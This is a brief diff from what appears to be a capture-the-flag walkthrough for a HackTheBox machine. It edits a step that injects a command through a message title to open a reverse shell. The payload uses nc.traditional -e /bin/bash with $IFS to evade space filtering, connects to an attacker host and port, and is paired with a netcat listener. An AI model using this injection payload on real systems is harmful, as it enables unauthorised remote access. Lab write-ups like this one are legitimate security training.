@@ -17,7 +17,7 @@ http://doctors.htb/login?next=%2F => login page
 
     Go to register and create an account!
 Go to new message change title with a new one and go for reverse shell:
-    `<im g src=http://boxip/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'attackbox'$IFS’attaport')>`
+    img src=http://boxip/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'attackbox'$IFS’attaport')
     $ nc -lvnp 9003
 
 
